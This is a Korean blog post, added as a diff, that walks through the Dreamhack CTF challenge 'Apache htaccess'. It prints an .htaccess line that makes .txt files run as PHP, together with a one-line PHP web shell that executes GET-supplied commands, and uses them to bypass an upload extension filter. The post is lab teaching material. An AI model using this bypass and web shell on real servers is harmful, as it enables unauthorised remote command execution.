@@ -1,0 +1,28 @@
+---
+layout: post
+title:  "[Dreamhack] Apache htaccess"
+date:   2025-04-22 08:42:22 +0900
+featured: /assets/images/블로그11.png
+categories: jekyll update
+---
+<p>안녕하세요. 이번에 해볼 문제는 Apache htaccess입니다.</p>
+<img src="/assets/images/11/1.png" style="max-width: 100%; height: auto;">
+<p>처음 페이지를 보시면 파일을 업로드하는 페이지입니다.</p>
+<img src="/assets/images/11/2.png" style="max-width: 100%; height: auto;">
+<img src="/assets/images/11/3.png" style="max-width: 100%; height: auto;">
+<p>소스를 보면 index 페이지에서 파일을 업로드하면 upload 페이지에서 업로드 된 파일 경로를 출력해주는 것 같은데요. 자세히 보시면 '$deniedExts' 배열을 통해 php파일을 제한합니다.</p>
+<img src="/assets/images/11/4-1.png" style="max-width: 100%; height: auto;">
+<p>문제의 제목을보면 'Apache htaccess'입니다. '.htaccess'파일을 이용해서 풀 수 있음을 추측할 수 있는데요. '.htaccess'는 아파치(Apache) 웹 서버에서 디렉토리별 설정을 할 수 있는 파일입니다. 간단히 말하면, '.htaccess' 파일을 통해 특정 폴더에 대한 접근 권한, 리디렉션, URL 변경, 파일 처리 방식 등을 설정할 수 있는데요. 이번 이용해볼 기능은 파일 처리 방식을 설정입니다.</p>
+<pre style="background-color: #f4f4f4; padding: 10px; border-radius: 6px; overflow-x: auto; margin-top: 10px;"><code style="font-family: Consolas, Monaco, monospace; color: #333;">AddType application/x-httpd-php .txt</code></pre>
+<p>-AddType : 특정 확장자 파일을 어떤 방식으로 브라우저나 서버가 처리할지 지정<br>-application/x-httpd-php : 처리 할 MIME타입을 지정하는 부분으로, 해당 타입은 PHP 스크립트입니다.<br>-.txt : .txt 파일을 PHP처럼 실행되도록 지정합니다.</p>
+<img src="/assets/images/11/4-2.png" style="max-width: 100%; height: auto;">
+<p>index페이지에서 '.htaccess'파일을 업로드합니다.</p>
+<img src="/assets/images/11/5.png" style="max-width: 100%; height: auto;">
+<p>그 후 다시 index페이지로 돌아와 '.txt' 확장자로 변조 한 php 웹쉘을 업로드합니다.</p>
+<pre style="background-color: #f4f4f4; padding: 10px; border-radius: 6px; overflow-x: auto; margin-top: 10px;"><code style="font-family: Consolas, Monaco, monospace; color: #333;"><?php
+	system($_GET['cmd']);
+?></code></pre>
+<p>웹 쉘은 간단하게 system함수를 이용하여 GET메소드로 cmd파라미터로 받은 명령어를 실행하도록했습니다.</p>
+
+<img src="/assets/images/11/6.png" style="max-width: 100%; height: auto;">
+<p>upload페이지에 출력된 링크를 클릭하여 웹쉘을 실행한 뒤, 명령어를 입력하여 flag값을 얻습니다.</p>
